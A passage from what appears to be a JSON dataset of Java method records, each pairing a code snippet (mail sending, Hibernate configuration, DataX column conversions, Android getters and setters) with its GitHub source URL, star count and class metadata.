  this.t.sendMessage(message, recipients);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/JavaxMailSender.java", "stars": "18", "class": {"name": "JavaxMailSender", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": ["MessagingException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void close() throws MessagingException {    this.t.close();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/JavaxMailSender.java", "stars": "18", "class": {"name": "JavaxMailSender", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "ribbonRule", "params": ["IClientConfig", "ExecNodeDao", "JobExecNodeDao", "MachineLoadConf", "UserExecNodeDao"], "throws": null, "modifiers": ["public"], "return_type": "IRule", "snippet": "    public IRule ribbonRule(IClientConfig config, ExecNodeDao nodeDao, JobExecNodeDao jobExecNodeDao,                            MachineLoadConf conf, UserExecNodeDao userExecNodeDao) {        logger.info(\"Use MachineLoadRole config.\");        MachineLoadRule loadRule = new MachineLoadRule();        loadRule.initWithNiwsConfig(config);        loadRule.setNodeDao(nodeDao);        loadRule.setMachineLoadConf(conf);        loadRule.setJobExecNodeDao(jobExecNodeDao);        loadRule.setUserExecNodeDao(userExecNodeDao);        return loadRule;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/route/MachineLoadProviderConfig.java", "stars": "23", "class": {"name": "MachineLoadProviderConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dateTimeToString", "params": ["TemporalAccessor"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String dateTimeToString(TemporalAccessor obj) {        if (obj == null) return null;        // LocalDateTime        if (obj instanceof LocalDateTime) {            return DATE_TIME_FORMATTER.format(obj);        }        // LocalDate        else if (obj instanceof LocalDate) {            return DATE_FORMAT.format(obj);        }        // LocalTime        else if (obj instanceof LocalTime) {            return TIME_FORMATTER.format(obj);        }        return \"\";    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/StringUtil.java", "stars": "2", "class": {"name": "StringUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dateTimeToString", "params": ["TemporalAccessor", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String dateTimeToString(TemporalAccessor obj, String pattern) {        DateTimeFormatter formatter = DateTimeFormatter.ofPattern(pattern);        return formatter.format(obj);    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/util/StringUtil.java", "stars": "2", "class": {"name": "StringUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createMySQLConfiguration", "params": ["String", "int", "String", "String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Configuration", "snippet": "    public static Configuration createMySQLConfiguration(String host, int port, String database, String username, String password, String params) {        Configuration configuration = createHibernateConfiguration();        configuration.setProperty(\"hibernate.dialect\", \"org.hibernate.dialect.MySQL5Dialect\");        configuration.setProperty(\"hibernate.connection.driver_class\", \"com.mysql.cj.jdbc.Driver\");        configuration.setProperty(\"hibernate.connection.url\", \"jdbc:mysql://\" + host + \":\" + port + \"/\" + database + params);        configuration.setProperty(\"hibernate.connection.username\", username);        configuration.setProperty(\"hibernate.connection.password\", password);        return configuration;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/database/DatabaseFactory.java", "stars": "2", "class": {"name": "DatabaseFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSessionFactory", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "SessionFactory", "snippet": "    public static SessionFactory getSessionFactory(Configuration configuration) {        if(configuration == null) return null;        StandardServiceRegistry serviceRegistry = new StandardServiceRegistryBuilder().applySettings(configuration.getProperties()).build();        if(serviceRegistry == null) return null;        return configuration.buildSessionFactory(serviceRegistry);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/database/DatabaseFactory.java", "stars": "2", "class": {"name": "DatabaseFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createDatabaseInstance", "params": ["SessionFactory"], "throws": null, "modifiers": ["public", "static"], "return_type": "IDatabaseInstance", "snippet": "    public static IDatabaseInstance createDatabaseInstance(SessionFactory sessionFactory) {        if(sessionFactory == null) return null;        return new DatabaseInstance(sessionFactory);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/database/DatabaseFactory.java", "stars": "2", "class": {"name": "DatabaseFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createHibernateConfiguration", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Configuration", "snippet": "    public static Configuration createHibernateConfiguration() {        return new Configuration();    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/database/DatabaseFactory.java", "stars": "2", "class": {"name": "DatabaseFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "writeSyncNBT", "params": ["NBTTagCompound"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeSyncNBT(NBTTagCompound compound) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Base/Tile/TileEnergyBase.java", "stars": "2", "class": {"name": "TileEnergyBase", "extends": "TileBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "readSyncNBT", "params": ["NBTTagCompound"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readSyncNBT(NBTTagCompound compound) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Base/Tile/TileEnergyBase.java", "stars": "2", "class": {"name": "TileEnergyBase", "extends": "TileBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTitle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Title", "snippet": "\tpublic Title getTitle() {\t\treturn title;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTitleID", "params": ["Title"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTitleID(Title title) {\t\tthis.title = title;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPerson", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Person", "snippet": "\tpublic Person getPerson() {\t\treturn person;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPerson", "params": ["Person"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPerson(Person person) {\t\tthis.person = person;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCategory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getCategory() {\t\treturn category;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCategory", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCategory(String category) {\t\tthis.category = category;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getJob() {\t\treturn job;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setJob", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setJob(String job) {\t\tthis.job = job;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCharacters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String[] getCharacters() {\t\treturn characters;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCharacters", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCharacters(String[] characters) {\t\tthis.characters = characters;\t}", "url": "https://raw.githubusercontent.com/Luke-Grammer/IMDB-Database-Application/master/src/data/model/Job.java", "stars": "1", "class": {"name": "Job", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        Scanner scanner = new Scanner(System.in);        System.out.println(\"Enter array length: \");        int size = scanner.nextInt();        scanner.close();        double[] arr = new double[size];        for (int i = 0; i < arr.length; i++)            arr[i] = Math.random() * 100;        Arrays.sort(arr);        System.out.println(\"Array: \");        for (double i : arr)            System.out.printf(\"%6.2f\", i);        System.out.println();    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab1/src/test/java/com/demkom58/lab1/test/MathAndArraysTest.java", "stars": "2", "class": {"name": "MathAndArraysTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "respond", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Bundle", "snippet": "    public Bundle respond(Bundle extras) {        return mProvider.call(mMethod, mArg, extras);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/callable/CallableCursor.java", "stars": "74", "class": {"name": "CallableCursor", "extends": "MatrixCursor", "implements": null, "modifiers": ["final"]}}, {"method_name": "testIFiles", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testIFiles() {    Assert.assertEquals(new File(\"src/test/java/sktest/test/testfiles/SKUnitTest_testIFiles_null_i.json\"), skTestIFiles(FTN.JSON));  }", "url": "https://raw.githubusercontent.com/ShaneKing/org.shaneking.test/master/src/test/java/sktest/test/SKUnitTest.java", "stars": "2", "class": {"name": "SKUnitTest", "extends": "SKUnit", "implements": null, "modifiers": ["public"]}}, {"method_name": "testOFiles", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testOFiles() {    skPrint(skTestOFiles(FTN.JSON));  }", "url": "https://raw.githubusercontent.com/ShaneKing/org.shaneking.test/master/src/test/java/sktest/test/SKUnitTest.java", "stars": "2", "class": {"name": "SKUnitTest", "extends": "SKUnit", "implements": null, "modifiers": ["public"]}}, {"method_name": "calculateDistanceToFinalSnap", "params": ["android", "android"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int[] calculateDistanceToFinalSnap (android.support.v7.widget.RecyclerView.LayoutManager p0, android.view.View p1)\t{\t\treturn n_calculateDistanceToFinalSnap (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSingleSnapHelper.java", "stars": "2", "class": {"name": "StartSingleSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_calculateDistanceToFinalSnap", "params": ["android", "android"], "throws": null, "modifiers": ["native", "private"], "return_type": "int", "snippet": "\tprivate native int[] n_calculateDistanceToFinalSnap (android.support.v7.widget.RecyclerView.LayoutManager p0, android.view.View p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSingleSnapHelper.java", "stars": "2", "class": {"name": "StartSingleSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSingleSnapHelper.java", "stars": "2", "class": {"name": "StartSingleSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/StartSingleSnapHelper.java", "stars": "2", "class": {"name": "StartSingleSnapHelper", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "asBoolean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean asBoolean() {        if (null == super.getRawData()) {            return null;        }        return (Boolean) super.getRawData();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asLong", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long asLong() {        if (null == this.getRawData()) {            return null;        }        return this.asBoolean() ? 1L : 0L;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asDouble", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "    public Double asDouble() {        if (null == this.getRawData()) {            return null;        }        return this.asBoolean() ? 1.0d : 0.0d;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String asString() {        if (null == super.getRawData()) {            return null;        }        return this.asBoolean() ? \"true\" : \"false\";    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asBigInteger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigInteger", "snippet": "    public BigInteger asBigInteger() {        if (null == this.getRawData()) {            return null;        }        return BigInteger.valueOf(this.asLong());    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asBigDecimal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal asBigDecimal() {        if (null == this.getRawData()) {            return null;        }        return BigDecimal.valueOf(this.asLong());    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date asDate() {        throw DataXException.asDataXException(                CommonErrorCode.CONVERT_NOT_SUPPORT, \"Bool\u7c7b\u578b\u4e0d\u80fd\u8f6c\u4e3aDate .\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asBytes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] asBytes() {        throw DataXException.asDataXException(                CommonErrorCode.CONVERT_NOT_SUPPORT, \"Boolean\u7c7b\u578b\u4e0d\u80fd\u8f6c\u4e3aBytes .\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "validate", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void validate(final String data) {        if (null == data) {            return;        }        if (\"true\".equalsIgnoreCase(data) || \"false\".equalsIgnoreCase(data)) {            return;        }        throw DataXException.asDataXException(                CommonErrorCode.CONVERT_NOT_SUPPORT,                String.format(\"String[%s]\u4e0d\u80fd\u8f6c\u4e3aBool .\", data));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/BoolColumn.java", "stars": "23", "class": {"name": "BoolColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "getComplexImmutableAuthorId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ComplexImmutableAuthorId", "snippet": "  public ComplexImmutableAuthorId getComplexImmutableAuthorId() {    return theComplexImmutableAuthorId;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ComplexImmutableAuthor.java", "stars": "15", "class": {"name": "ComplexImmutableAuthor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getBio", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getBio() {    return bio;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ComplexImmutableAuthor.java", "stars": "15", "class": {"name": "ComplexImmutableAuthor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getFavouriteSection", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Section", "snippet": "  public Section getFavouriteSection() {    return favouriteSection;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ComplexImmutableAuthor.java", "stars": "15", "class": {"name": "ComplexImmutableAuthor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "equals", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(Object o) {    if (this == o) {      return true;    }    if (o == null || getClass() != o.getClass()) {      return false;    }    final ComplexImmutableAuthor that = (ComplexImmutableAuthor) o;    if (bio != null ? !bio.equals(that.bio) : that.bio != null) {      return false;    }    if (favouriteSection != that.favouriteSection) {      return false;    }    if (theComplexImmutableAuthorId != null ? !theComplexImmutableAuthorId.equals(that.theComplexImmutableAuthorId) : that.theComplexImmutableAuthorId != null) {      return false;    }    return true;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ComplexImmutableAuthor.java", "stars": "15", "class": {"name": "ComplexImmutableAuthor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "hashCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {    int myresult = theComplexImmutableAuthorId != null ? theComplexImmutableAuthorId.hashCode() : 0;    myresult = 31 * myresult + (bio != null ? bio.hashCode() : 0);    myresult = 31 * myresult + (favouriteSection != null ? favouriteSection.hashCode() : 0);    return myresult;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/blog/ComplexImmutableAuthor.java", "stars": "15", "class": {"name": "ComplexImmutableAuthor", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCode() {        return Code;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "AssetsBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(int Code) {        this.Code = Code;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "AssetsBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsg() {        return Msg;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "AssetsBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsg(String Msg) {        this.Msg = Msg;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "AssetsBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataBean", "snippet": "    public DataBean getData() {        return Data;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "AssetsBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setData", "params": ["DataBean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(DataBean Data) {        this.Data = Data;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "AssetsBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBalance", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BalanceBean", "snippet": "        public BalanceBean getBalance() {            return balance;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setBalance", "params": ["BalanceBean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setBalance(BalanceBean balance) {            this.balance = balance;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getContract", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ContractBean", "snippet": "        public ContractBean getContract() {            return contract;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setContract", "params": ["ContractBean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setContract(ContractBean contract) {            this.contract = contract;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getTotal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTotal() {            return total;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setTotal", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setTotal(String total) {            this.total = total;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPayMethods", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<PayMethodsBean>", "snippet": "        public List<PayMethodsBean> getPayMethods() {            return payMethods;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setPayMethods", "params": ["List<PayMethodsBean>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPayMethods(List<PayMethodsBean> payMethods) {            this.payMethods = payMethods;        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "DataBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getBalance", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getBalance() {                return balance;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setBalance", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setBalance(String balance) {                this.balance = balance;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getAvailable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getAvailable() {                return available;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setAvailable", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setAvailable(String available) {                this.available = available;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getFreezeForSell", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getFreezeForSell() {                return freezeForSell;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setFreezeForSell", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setFreezeForSell(String freezeForSell) {                this.freezeForSell = freezeForSell;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getFreezeForRefound", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getFreezeForRefound() {                return freezeForRefound;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setFreezeForRefound", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setFreezeForRefound(String freezeForRefound) {                this.freezeForRefound = freezeForRefound;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "BalanceBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getBalance", "params": [], "throws": null, 